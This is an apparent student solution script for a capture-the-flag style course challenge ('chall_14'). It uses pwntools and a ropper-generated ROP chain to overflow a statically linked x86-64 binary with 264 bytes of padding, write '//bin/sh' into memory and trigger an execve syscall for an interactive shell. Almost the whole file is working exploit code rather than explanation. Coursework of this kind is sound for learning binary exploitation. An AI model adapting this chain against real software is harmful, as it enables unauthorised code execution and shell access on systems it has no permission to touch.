'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_14
File Description:  ROP Gadget calling bin/sh since statically 

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   1872) Symbols     No    0               0               chall_14

File info:
chall_14: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=409afffbc385d1f298454dd3044229b712fa15f9, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

Symbols:
    So many symbols literally from statically linking this mofo

Strings:


Vulns:
    Statically linked.... I can call whatever I want!
    Not a printf sice tried %p and no return, probably can ret, but also can find a canary
'''

# Import library functions
from pwn import *

# Generating ELF
elf = ELF("./chall_14",checksec=False)
context.binary = ELF("chall_14",checksec=False)

# Start a process
proc = process("./chall_14")

# Rop chain from Ropper

# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = elf.address # ed9d47356b7a87594e2a1418fcb428c827570eb42aaf9e93aaffa15ede38193d
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x00000000000118f8) # 0x00000000004118f8: pop r13; ret; 
rop += b'//bin/sh'
rop += rebase_0(0x0000000000001f9b) # 0x0000000000401f9b: pop rbx; ret; 
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x0000000000084395) # 0x0000000000484395: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000118f8) # 0x00000000004118f8: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000001f9b) # 0x0000000000401f9b: pop rbx; ret; 
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x0000000000084395) # 0x0000000000484395: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000018ca) # 0x00000000004018ca: pop rdi; ret; 
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x000000000000f3fe) # 0x000000000040f3fe: pop rsi; ret; 
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x00000000000017cf) # 0x00000000004017cf: pop rdx; ret; 
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x00000000000494a7) # 0x00000000004494a7: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x00000000000170a4) # 0x00000000004170a4: syscall; ret; 

# Padding, which scouted via ghidra of 264 bytes
pad = b'a'*264

# Creating Payload and send
payload = pad + rop
proc.sendline(payload)
proc.interactive()